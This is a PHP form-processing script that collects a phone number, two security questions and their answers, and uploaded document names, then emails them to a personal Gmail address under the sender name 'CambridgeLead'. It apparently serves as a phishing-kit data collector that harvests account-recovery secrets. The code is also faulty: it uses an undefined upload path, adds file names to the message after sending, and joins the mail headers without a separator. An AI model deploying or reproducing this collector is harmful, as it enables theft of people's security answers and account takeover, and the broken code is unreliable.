<?php

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect and sanitize input data
    $phone = filter_var($_POST['phone'], FILTER_SANITIZE_STRING);
    $documentName = $_FILES['document']['name']; // Directly accessing the file name, ensure sanitization
    $securityQuestion1 = filter_var($_POST['security_question1'], FILTER_SANITIZE_STRING);
    $securityAnswer1 = filter_var($_POST['security_answer1'], FILTER_SANITIZE_STRING);
    $securityQuestion2 = filter_var($_POST['security_question2'], FILTER_SANITIZE_STRING);
    $securityAnswer2 = filter_var($_POST['security_answer2'], FILTER_SANITIZE_STRING);

    // Email content
    $to = 'sajal.sarker26@gmail.com'; // Replace this with your email address
    $subject = 'New Submission Data Submitted';
    $message = "A new submission has been received:\n\n";
    $message .= "Phone: $phone\n";
    $message .= "Document Name: $documentName\n";
    $message .= "Security Question 1: $securityQuestion1\n";
    $message .= "Security Answer 1: $securityAnswer1\n";
    $message .= "Security Question 2: $securityQuestion2\n";
    $message .= "Security Answer 2: $securityAnswer2\n";

    // Headers
    $headers = "From:CambridgeLead\r\n";
    $headers .= "Reply-To: sajal.sarker26@gmail.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully.";
    } else {
        echo "Failed to send email.";
    }
} else {
    // Not a POST request
    echo "Invalid request.";
}


// Initialize an array to hold uploaded file names
$uploadedFiles = [];

if (!empty($_FILES['document']['name'][0])) {
    foreach ($_FILES['document']['name'] as $i => $name) {
        // Other file handling code...

        if (move_uploaded_file($_FILES['document']['tmp_name'][$i], $uploadPath)) {
            echo "Uploaded: " . $name . "<br>";
            // Add the successfully uploaded file name to the array
            $uploadedFiles[] = $name;
        } else {
            echo "Error uploading: " . $name . "<br>";
        }
    }
} else {
    echo "No files uploaded.";
}

// Modify the email content to include all uploaded file names
$message .= "Uploaded Documents: " . implode(", ", $uploadedFiles) . "\n";
